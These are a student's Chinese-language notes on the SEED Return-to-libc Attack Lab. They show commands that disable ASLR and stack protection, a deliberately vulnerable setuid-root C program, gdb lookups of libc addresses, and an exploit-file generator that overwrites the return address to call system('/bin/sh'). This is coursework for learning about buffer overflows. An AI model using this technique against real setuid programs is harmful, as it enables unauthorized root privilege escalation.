# Return-to-libc Attack Lab

Day one 中有一个实验, *Buffer-Overflow Vulnerability lab* 应该是和这个实验承接的, 都属于缓冲区溢出攻击. 之前的实验主要利用了可运行栈来展开攻击, 这个实验的主题就是 *Return-to-libc attack*, 一个新的方向. 

::: danger 有问题
- 
:::

## 预备知识

- 汇编基础  
[阮一峰-汇编语言入门教程](http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html)
- shellcode  
[绿盟科技博客-手把手简易实现shellcode及详解](http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/) 
- 实验指导里的 Guidelines

<!-- ## 实验环境 -->

## 实验任务

### Turning off countermeasures

关闭相关防御措施. 

#### Address Space Randomization 
系统自带的地址空间随机化的机制. 

``` sh
sudo sysctl -w kernel.randomize_va_space=0
```

#### The StackGuard Protection Scheme

编译 C 文件的时候让 GCC 关闭栈保护
``` sh
gcc -fno-stack-protector example.c
```

#### Non-Executable Stack
不可执行栈. 

``` sh
gcc -z execstack -o test test.c
gcc -z noexecstack -o test test.c
```

[参考](https://blog.csdn.net/zither/article/details/443603)

#### Configuring /bin/sh (Ubuntu 16.04 VM only)

Ubuntu 16.04 会阻止 Set-UID 应用程序, Set-UID 是啥

`/bin/bash` 连接的是 `/bin/dash`, 我们希望连接到 `/bin/zsh`, 防止我们在攻击时失去相关的权限?

Ubuntu Shell 都有哪些 

### The Vulnerable Program

这里给出一个存在隐患的程序 retlib.c . 之间创建在共享文件夹中吧, 方便两头修改. 
``` c
#include <stdlib.h> 
#include <stdio.h> 
#include <string.h>

#ifndef BUF_SIZE 
#define BUF_SIZE 12
#endif

/**
 * 创造溢出, buffer 数组长度只有 12, fread 方法直接从 badfile 中读了 300 的数据到 buffer 中. 
 */
int bof (FILE *badfile) {
    char buffer[BUF_SIZE];
    fread(buffer, sizeof(char), 300, badfile);
    return 1; 
}

int main (int argc, char **argv) {
    FILE *badfile;
    char dummy[BUF_SIZE*5]; 
    // 将 dummy 中所有的元素全部设为 0
    memset(dummy, 0, BUF_SIZE*5);
    badfile = fopen("badfile", "r"); 
    bof(badfile);
    printf("Returned Properly\n");
    fclose(badfile);
    return 1;
}
```

这一段程序创建了一个 5 倍 BUF_SIZE 长度的数组, 并赋值所有元素为 0, 然后打开 badfile 文件. `bof` 方法中创建一个长度为 BUF_SIZE 的缓冲区数组, 并向其写入 300 长度的 badfile 文件中的数据, 创造溢出. 

``` shell
gcc -DBUF_SIZE=12 -fno-stack-protector -z noexecstack -o retlib retlib.c 
sudo chown root retlib
sudo chmod 4755 retlib
```
按照要求 1 行中 `-DBUF_SIZE` 值应该为代码中 `BUF_SIZE` 的值. 具体可以参考 *For instructors* 中的内容

也有同志提出了另一种方式, 直接在 root 环境编译, 存疑. 

::: warning retlib.c 中 dummy 数组的作用是什么
?
:::

### T1 Finding out the addresses of libc functions

在关闭随机内存地址的保护机制后, 找出 libc 库 中方法在内存中的地址. 
利用 GDB 工具可以找到 `system` 与 `exit` 方法. 

GDB: GUN Project Debuger [参考](https://blog.csdn.net/haoel/article/details/2879)

``` sh
gdb -q retlib
run
>>> ... ...
p system
>>> $1 = {<text variable, no debug info>} 0xb7da4da0 <__libc_system>
p exit
>>> $2 = {<text variable, no debug info>} 0xb7d989d0 <__GI_exit>
```

更换文件, 修改文件的用户所有, 切换 shell, 都会导致地址出现变化. 

### T2 Putting the shell string in the memory

shell 是用户与系统之间交互的界面, 它是程序, 系统工作时就是一个进程. 

shell 在接受用户的任务之后, 会先 fork 一个子进程, 并将所有 exported shell 变量放入到子进程的环境变量中, 让子进程能够访问这些变量. 那么攻击的方法就是在这些变量中插入一些不该有的东西. 

``` sh
export MYSHELL=/bin/sh 
env | grep MYSHELL 
>>> MYSHELL=/bin/sh
```
export 指令
env 指令
grep 指令

可以创建一个 task2.c 的文件, 并写入
``` c
#include<stdio.h>
void main(){
    char* shell = getenv("MYSHELL"); 
    if (shell)
        printf("%x\n", (unsigned int)shell);
}
```

``` sh
gcc -o task2 task2.c && ./task2
>>> bffffdf1
```

如果再创建一个 task2-1.c 内容和 task2.c 一致
``` sh
gcc -o task2-1 task2-1.c && ./task2-1
>>> bffffded
```
同一个 shell 变量的地址在不同程序中打印出的结果不一致, 但很接近. 

### T3 Exploiting the buffer-overflow vulnerability

当前用户已经能够使用 sudo 权限, 但是无法进入到 root 环境中. 

在之前编译 retlib.c 之后, 将文件所有者改为 root, 同时修改文件的读写权限. 

sudo 指令应该是在自己的用户环境下使用 root 权限; 如果直接使用 su, 则进入到 root 环境下. 

实验指导中给出了: `exit()` `system()` `/bin/sh` 三个东西,  `/bin/sh` 需要作为参数传入到 `system()` 方法中, 且 `/bin/sh` 存放在 `MYSELL` 变量中

::: warning `exit()` 方法的作用是什么?
它和 `system()` 方法之间的关系? 
:::

首先可以确定两个方法与 `MYSHELL` 变量的地址. 
``` sh
0xbffffe03  # "/bin/sh" 
0xb7e42da0  # system()  
0xb7e369d0  # exit() 
```
或
``` sh
0xbffffdef  # "/bin/sh" 
0xb7da4da0  # system()  
0xb7d989d0  # exit() 
```

那么主要的问题是如何确定 X Y Z ? 

先创建一个 badfile, 写入键盘顺序的 `1-0`, `q-p`, `a-;`, `z-/`, 总共四行 40 个字符. 之后在 gdb 中运行 retlib, 中间 code 部分会提示在 0x62206863 的位置存在问题, 对应的字符为 `ghjk`, 那么有 24 个字符被正常读取, 从第 24 开始 (0 计数) 出现了问题. 

::: warning BUF_SIZE 的大小为 12, 和这里的 24 有什么关系
?
:::

::: warning 如何选择 X Y Z
那么 X Y Z 是不是应该为 24 28 32 这三个数字的组合? 没人谈谈这个三个数字的故事么. 
:::

下面这一段是没有什么问题的. 
``` c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    char buf[40];
    FILE *badfile;
    badfile = fopen("./badfile", "w");
    /* You need to decide the addresses and
    the values for X, Y, Z. The order of the following three statements does not imply the order of X, Y, Z. Actually, we intentionally scrambled the order. */
    *(long *) &buf[32] = 0xbffffdef ; // "/bin/sh" 
    *(long *) &buf[24] = 0xb7da4da0 ; // system()  
    *(long *) &buf[28] = 0xb7d989d0 ; // exit() 
    // printf("%d\n", sizeof(long));
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
```

但是运行出来的结果: 
![](/note/img/2020-02-07-11-14-22.png)

仍然是 `$` 并没有预期的 `#`, 输出的第一行是 `MYSHELL` 的地址. 

关于 `exit` 方法, 如果尝试删掉它, 会导致失败, 提示溢出. 

我先做到这吧, 问题太硬了. 

#### 我又回来了

在 *Buffer-Overflow Vulnerability Lab* 实验指导的 Guidelines 有这么一幅图: 

![](/note/img/2020-02-07-13-27-44.png)

从右侧的 b 可以看到, `func` 方法在栈中由高位到低位分别是方法参数, 返回地址, 然后才是方法内部的东西. 

那么结合 T3 的要求, 可以做出一个**假设**: 缓冲溢出的内容会被写入到栈内. 那么由高位到低位, 我们先写入 `system` 方法的参数 `MYSHELL` 的地址, 然后写下返回地址, 即 `exit` 方法地址, 最后写入 `system` 方法地址. 32 位系统寄存器 4B 一个, 所以 X Y Z 的间隔为 4. 

retlib 从 badfile 中一共读取了 300 长度的内容 (可能实际没有这么多), 这些东西分成三个部分: 写入 buffer 数组的, 记录地址信息的, 还有一些空余空间. 

那么另外一个**假设**是, 程序应该专门划出了一个大小为 12 的栈空间来保存 buffer 数组, 剩下的数据 (包括多余数据和地址信息) 应该写在紧贴着 buffer 数组的下方 (低位), 同时, ESP 也被修改为剩余数据开头元素在栈中的地址. **特别地, 剩余数据的入栈顺序是数组逆序**. 如此, 程序才有可能将相关的地址信息推出栈, 这也能解释为什么是 32 24 28, 而不是 28 24 32. 

![](/note/img/2020-02-07-14-23-48.png)



### T4 Turning on address randomization

启动内存地址随机化机制, 重新攻击. 
``` sh
sudo sysctl -w kernel.randomize_va_space=2
```

### T5 Defeat Shell’s countermeasure



### T6 Defeat Shell’s countermeasure without putting zeros in input


